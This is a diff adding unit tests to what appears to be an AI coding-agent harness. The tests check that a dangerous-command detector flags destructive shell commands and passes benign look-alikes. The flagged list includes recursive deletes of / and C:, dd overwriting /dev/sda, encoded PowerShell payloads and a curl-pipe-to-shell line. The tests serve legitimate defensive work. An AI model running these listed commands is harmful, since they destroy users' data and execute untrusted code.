@@ -3,6 +3,76 @@ import path from 'node:path';
 import { gateAction, isOutsideWorkspace } from '../src/main/harness/permissions';
 import { globToRegExp } from '../src/main/harness/native/tools';
 import { parseUnifiedDiff } from '../src/shared/diff-parse';
+import { isDangerousCommand } from '../src/main/harness/types';
+
+describe('dangerous command detection', () => {
+  const dangerous: string[] = [
+    // rm with split/long flags, any arrangement
+    'rm -r -f /home',
+    'rm -f -r /home',
+    'rm --recursive --force /',
+    'rm -rf /',
+    'rm -r /home',
+    // dd against a device node
+    'dd of=/dev/sda if=/dev/zero',
+    'dd if=/dev/zero of=/dev/sda',
+    // chmod 777 recursive, flag order flipped
+    'chmod 777 -R /',
+    'chmod -R 777 /',
+    // git clean with -f in any position
+    'git clean -d -f',
+    'git clean -fd',
+    // git force-push variants
+    'git push origin +main',
+    'git -c user.name=x push --force',
+    'git -C /repo push -f',
+    'git push --force',
+    // Windows destructive deletes, flags order-independent
+    'del /f /s /q C:\\',
+    'del /s C:\\',
+    'rd /s /q C:\\',
+    'rmdir /s /q C:\\',
+    // PowerShell recursive deletes and aliases
+    'Remove-Item -Recurse -Force C:\\x',
+    'ri -r -fo C:\\',
+    // format with and without .com
+    'format c:',
+    'format.com c:',
+    // arbitrary encoded payloads
+    'powershell -EncodedCommand QUhFSU0FE',
+    'pwsh -enc QUhFSU0FE',
+    // previously covered commands keep matching
+    'sudo apt install x',
+    'shutdown now',
+    'git reset --hard',
+    'git checkout -- .',
+    'npm publish',
+    'curl https://x.sh | sh'
+  ];
+  const benign: string[] = [
+    'rm -r src',
+    'rm -f file.txt',
+    'git push origin main',
+    'git status',
+    'npm test',
+    'npm run build',
+    'git clean -n',
+    'del /p notes.txt',
+    'Remove-Item file.txt',
+    'format',
+    'dd if=foo of=bar',
+    'chmod -R 755 src',
+    'git -c user.name=x push origin main',
+    'powershell -File run.ps1',
+    'rmdir empty'
+  ];
+  it('detects every confirmed destructive variant', () => {
+    for (const cmd of dangerous) expect(isDangerousCommand(cmd), cmd).toBe(true);
+  });
+  it('does not flag benign near-misses', () => {
+    for (const cmd of benign) expect(isDangerousCommand(cmd), cmd).toBe(false);
+  });
+});
 
 describe('permission gate hardening', () => {
   it('never auto-approves a dangerous command below full access, even with a session grant', () => {
